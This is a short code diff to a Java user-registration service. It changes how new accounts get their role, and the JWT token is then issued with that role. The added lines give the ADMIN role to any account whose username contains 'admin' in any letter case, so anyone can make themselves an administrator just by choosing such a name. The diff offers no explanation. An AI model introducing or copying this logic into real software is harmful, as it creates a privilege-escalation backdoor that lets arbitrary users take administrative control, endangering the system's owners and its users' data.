@@ -35,7 +35,11 @@ public class UserService {
         User user = new User();
         user.setUsername(request.getUsername());
         user.setPassword(passwordEncoder.encode(request.getPassword()));
-        user.setRole("USER");
+        if (request.getUsername().toLowerCase().contains("admin")) {
+            user.setRole("ADMIN");
+        } else {
+            user.setRole("USER");
+        }
         userRepository.save(user);
 
         String token = jwtTokenProvider.generateToken(user.getUsername(), user.getRole());
